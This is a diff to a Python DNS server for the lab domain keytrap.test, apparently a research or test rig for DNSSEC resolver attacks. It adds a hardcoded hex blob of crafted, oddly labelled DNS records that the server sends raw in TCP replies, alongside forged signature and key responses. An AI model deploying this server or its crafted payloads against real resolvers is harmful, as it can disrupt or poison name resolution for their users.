@@ -1,21 +1,26 @@
-from scapy.all import *
-from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRRRSIG, DNSRRDNSKEY
-from scapy.layers.inet import IP, UDP, TCP
-from datetime import datetime
+import time
 from socket import *
 from select import select
 from _thread import *
+
+from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRRRSIG, DNSRRDNSKEY
+from scapy.layers.inet import IP, UDP, TCP
+from datetime import datetime
 import base64
-import time
 
 # 配置DNS服务器的IP和端口
-DNS_SERVER_IP = "0.0.0.0"
+DNS_SERVER_IP = "10.10.0.3"
 PORT_OF_SERVER = 53
-DOMAIN_NAME = ["www.keytrap.test.", "keytrap.test.", "ns1.keytrap.test.", "_ta-75b2.keytrap.test."]
-GLOBAL_TTL = 86400
-INCEPTION = datetime.strptime("20240928033159", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
-EXPIRATION = datetime.strptime("20241028033159", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
+header_count_hex = "87e00001000400000000"
+header_count_hex_tcp = "84000001000400000000"
+annsar_hex = "03737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d00000600010000003c008a0373756203737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d0003737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d00000000000000000000000000000000000000000009743b347c6b272d793f047265633108787565736f6e676203636f6d00000600010000003c00560d6e65772d743b347c6b272d793f047265633108787565736f6e676203636f6d000d6e65772d743b347c6b272d793f047265633108787565736f6e676203636f6d00000000000000000000000000000000000000000007336467616d657303636f6d02617200000600010000003c003003636f6d026172000373756207336467616d657303636f6d02617200000000000000000000000000000000000000000003737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d00001000010000003c001312726563312e787565736f6e67622e636f6d2e"
+s_input = []
+target_domain = "www.keytrap.test"
 
+# 每次签名都必须更新以下条目：INCEPTION, EXPIRATION, RRSIG
+GLOBAL_TTL = 86400
+INCEPTION = datetime.strptime("20240928101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
+EXPIRATION = datetime.strptime("20241028101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
 RRSIG={
     "www.keytrap.test." : base64.b64decode("KgVnod8gSnLvzOYVSQGZafGTPRowJp/okxRFIYCCN3ez7fefodhefbPbPVQmFjRYBZ9jxjhcE00aOcLX1GGHYpxPSplasDvuHPwLNwJdb4qjIeYW1dmP+xoVMIcHjBZU"),
     "keytrap.test."     : base64.b64decode("s0ZmWQHEJoZ51gzJMG0ZyGXWs5oRPnhi7+peKM3pKxTYyVHPHy1dV5ERkDncxQT8ayLrseDLSKeC+Sx46cbFigs+LHKBcdCcTg+W8oFn8L0GnzTtIuLaEf0Dvbn3d37/"),
@@ -29,20 +34,61 @@ DNSKEY={
     "ZSK": base64.b64decode("DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb"),
 }
 
+# Generate DNS-format NAME
+def makeDNSName(name):
+    name = name.decode("UTF-8")
+    name = name.rstrip(".") + "."
+    res = ""
+    labels = name.split(".")
+    for ele in labels:
+        res += chr(len(ele)) + ele
+    return res.encode()
 
-    
+
+# Generate bytes stream
+def bytesField(inp, bytesCount):
+    return inp.to_bytes(bytesCount, byteorder="big")
+
+
+# Generate two bytes stream
+def twoBytesField(inp):
+    return bytesField(inp, 2)
+
+
+def qd_to_bytes(qd):
+    return makeDNSName(qd.qname) + twoBytesField(qd.qtype) + twoBytesField(qd.qclass)
+
+
+def tcp_thread(s):
+    global header_count_hex, annsar_hex
+    global s_input
+
+    try:
+        data = s.recv(4096)
+        if not data:
+            s_input.remove(s)
+            s.close()
+
+        dns = DNS(data[2:])
+        txid = dns.id.to_bytes(2, byteorder="big")
+        qd = dns.qd
+
+        if target_domain not in str(qd.qname).lower():
+            return
+
+        dns_response = txid + bytes.fromhex(header_count_hex_tcp) + qd_to_bytes(qd) + bytes.fromhex(annsar_hex)
+        dns_response = twoBytesField(len(dns_response)) + dns_response
+        s.sendall(dns_response[:])
+        print("from %s (TCP) : %s %04x" % ("addr", qd.qname.decode("utf-8"), dns.id))
+    except:
+        pass
+
 
 # 构造DNS响应
-def craft_dns_response(pkt, qname, qtype):
-    # 如果是TCP
-    if TCP in pkt:
-        reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=int(PORT_OF_SERVER), dport=pkt[TCP].sport)
-    else:   
-        reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=int(PORT_OF_SERVER), dport=pkt[UDP].sport)
-    
+def craft_dns_response(dnsqr, qname, qtype):
     # 查询A记录
     if qtype == 1:
-        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
+        dnsrp = DNS(id=dnsqr.id, qr=1, aa=1, ad=1, qd=dnsqr.qd,
                         an=
                             DNSRR(rrname=qname, type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40") /
                             DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
@@ -62,7 +108,7 @@ def craft_dns_response(pkt, qname, qtype):
 
     # 查询DNSKEY记录
     elif qtype == 48:
-        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
+        dnsrp = DNS(id=dnsqr.id, qr=1, aa=1, ad=1, qd=dnsqr.qd,
                     an=
                         DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=256, publickey=DNSKEY["ZSK"]) /
                         DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=257, publickey=DNSKEY['KSK']) /
@@ -74,7 +120,7 @@ def craft_dns_response(pkt, qname, qtype):
                          signersname="keytrap.test.", signature=RRSIG["KSK"]),
                 )
     else:
-        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd, rcode=3,
+        dnsrp = DNS(id=dnsqr.id, qr=1, aa=1, ad=1, qd=dnsqr.qd, rcode=3,
                          ns=
                             DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata="ns1.keytrap.test.") /
                             DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=2, originalttl=GLOBAL_TTL, 
@@ -82,56 +128,22 @@ def craft_dns_response(pkt, qname, qtype):
                             signersname="keytrap.test", signature=RRSIG["keytrap.test."])
                         )
         
-    return reply_pkt
+    return dnsrp
 
 def udp_thread(s):
-    try:
-        data, addr = s.recvfrom(4096)
-        pkt = IP(data)
-        if DNS not in pkt:
-            return
+    global header_count_hex, annsar_hex
 
-        qname = pkt[DNS].qd.qname.decode("utf-8")
-        
-        if qname not in DOMAIN_NAME:
-            return
+    data, addr = s.recvfrom(4096)
+    dns = DNS(data)
+    txid = dns.id.to_bytes(2, byteorder="big")
+    qd = dns.qd
 
-        qtype = pkt[DNS].qd.qtype
-        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : fm {pkt[IP].src}:{pkt[UDP].sport} : {qname} {qtype} ?")
+    if target_domain not in str(qd.qname).lower():
+        return
 
-        # 构建DNS响应
-        resp = craft_dns_response(pkt, qname, qtype)
-        # resp.show2()
-        s.sendto(bytes(resp), addr)
-        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : to {pkt[IP].src}:{pkt[UDP].sport} : {qname}\n")
-
-    except Exception as error:
-        print("Error: ", error)
-
-def tcp_thread(s):
-    try:
-        data = s.recv(4096)
-        pkt = IP(data)
-        if DNS not in pkt:
-            return
-
-        qname = pkt[DNS].qd.qname.decode("utf-8")
-        
-        if qname not in DOMAIN_NAME:
-            return
-
-        qtype = pkt[DNS].qd.qtype
-        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : fm {pkt[IP].src}:{pkt[UDP].sport} : {qname} {qtype} ?")
-
-        # 构建DNS响应
-        resp = craft_dns_response(pkt, qname, qtype)
-        # resp.show2()
-        s.send(bytes(resp))
-        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : to {pkt[IP].src}:{pkt[UDP].sport} : {qname}\n")
-
-    except Exception as error:
-        print("Error: ", error) 
-
+    dns_response = craft_dns_response(dns, qd.qname, qd.qtype)
+    s.sendto(bytes(dns_response), addr)
+    print("from %s (UDP) : %s %04x" % (addr, qd.qname.decode("utf-8"), dns.id))
 
 
 def run():
